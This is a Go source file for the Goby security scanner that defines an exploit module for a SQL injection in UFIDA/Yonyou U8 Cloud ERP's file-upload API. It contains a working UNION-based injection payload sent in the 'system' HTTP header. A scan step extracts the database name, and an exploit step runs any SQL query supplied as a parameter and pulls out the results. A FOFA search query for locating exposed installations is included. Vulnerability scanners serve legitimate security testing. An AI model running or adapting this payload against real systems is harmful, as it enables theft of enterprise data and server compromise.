package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "UFIDA U8 Cloud /u8cloud/api/file/upload/base64 SQL Injection Vulnerability",
    "Description": "<p>UF U8C-Cloud is an enterprise-level management software developed by UF Software, also known as UF U8C. It is one of UFIDA's core products and is designed to help enterprises achieve comprehensive information management and operations. UFIDA-U8C-Cloud provides a series of functional modules covering enterprise resource planning (ERP), financial accounting, human resources management, supply chain management, manufacturing, sales and customer relationship management. It can help enterprises centrally manage and control various business processes, improve work efficiency, reduce costs, and provide functions such as decision support and business analysis. There is a SQL injection vulnerability in the UFIDA U8C-loud /u8cloud/api/file/upload/base64 interface. An attacker can use this vulnerability to execute arbitrary SQL statements, such as querying data, downloading data, writing webshells, executing system commands, and bypassing login restrictions. wait.</p>",
    "Product": "UF U8C-Cloud",
    "Homepage": "www.yonyou.com",
    "DisclosureDate": "2024-03-09",
    "PostTime": "2024-05-15",
    "Author": "secure_insights@163.com",
    "FofaQuery": "body=\"http://uclient.yonyou.com/api/uclient/public/download/windows\"",
    "GobyQuery": "body=\"http://uclient.yonyou.com/api/uclient/public/download/windows\"",
    "Level": "2",
    "Impact": "<p>An attacker can use this vulnerability to execute arbitrary SQL statements, such as querying data, downloading data, writing webshells, executing system commands, and bypassing login restrictions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.yonyou.com\">www.yonyou.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_67810151/article/details/136851995"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql_query",
            "type": "input",
            "value": "db_name()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/u8cloud/api/file/upload/base64",
                "follow_redirect": false,
                "header": {
                    "isEncrypt": "N",
                    "sign": "token",
                    "Accept": "*/*",
                    "Content-Type": "application/json",
                    "system": "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(119)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(113)+CHAR(43)+CHAR(32)+ISNULL(CAST(db_name() AS VARCHAR(4000)),CHAR(32))+CHAR(32)+CHAR(43)+CHAR(119)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(113),NULL-- QIwq",
                    "User-Agent": "python-requests/2.31.0",
                    "Accept-Encoding": "gzip, deflate",
                    "trantype": "pk",
                    "Content-Length": "0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "wellq\\+(.*?)\\+wellq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/u8cloud/api/file/upload/base64"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/u8cloud/api/file/upload/base64",
                "follow_redirect": false,
                "header": {
                    "isEncrypt": "N",
                    "sign": "token",
                    "Accept": "*/*",
                    "Content-Type": "application/json",
                    "system": "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(119)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(113)+CHAR(43)+CHAR(32)+ISNULL(CAST({{{sql_query}}} AS VARCHAR(4000)),CHAR(32))+CHAR(32)+CHAR(43)+CHAR(119)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(113),NULL-- QIwq",
                    "User-Agent": "python-requests/2.31.0",
                    "Accept-Encoding": "gzip, deflate",
                    "trantype": "pk",
                    "Content-Length": "0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "(wellq\\+(.*?)\\+wellq)",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(wellq\\+(.*?)\\+wellq)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "用友U8 Cloud /u8cloud/api/file/upload/base64 SQL 注入漏洞",
            "Product": "用友U8 Cloud",
            "Description": "<p>用友U8C-Cloud是一款由用友软件开发的企业级管理软件，也被称为用友U8C。它是用友公司的核心产品之一，旨在帮助企业实现全面的信息化管理和运营。用友-U8C-Cloud提供了一系列功能模块，涵盖了企业资源规划（ERP）、财务会计、人力资源管理、供应链管理、生产制造、销售与客户关系管理等方面。它可以帮助企业集中管理和控制各个业务流程，提高工作效率、降低成本，并提供决策支持和业务分析等功能。用友U8C-loud /u8cloud/api/file/upload/base64接口存在SQL注入漏洞，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "UFIDA U8 Cloud /u8cloud/api/file/upload/base64 SQL Injection Vulnerability",
            "Product": "UF U8C-Cloud",
            "Description": "<p>UF U8C-Cloud is an enterprise-level management software developed by UF Software, also known as UF U8C. It is one of UFIDA's core products and is designed to help enterprises achieve comprehensive information management and operations. UFIDA-U8C-Cloud provides a series of functional modules covering enterprise resource planning (ERP), financial accounting, human resources management, supply chain management, manufacturing, sales and customer relationship management. It can help enterprises centrally manage and control various business processes, improve work efficiency, reduce costs, and provide functions such as decision support and business analysis. There is a SQL injection vulnerability in the UFIDA U8C-loud /u8cloud/api/file/upload/base64 interface. An attacker can use this vulnerability to execute arbitrary SQL statements, such as querying data, downloading data, writing webshells, executing system commands, and bypassing login restrictions. wait.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.yonyou.com\" target=\"_blank\">www.yonyou.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>An attacker can use this vulnerability to execute arbitrary SQL statements, such as querying data, downloading data, writing webshells, executing system commands, and bypassing login restrictions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}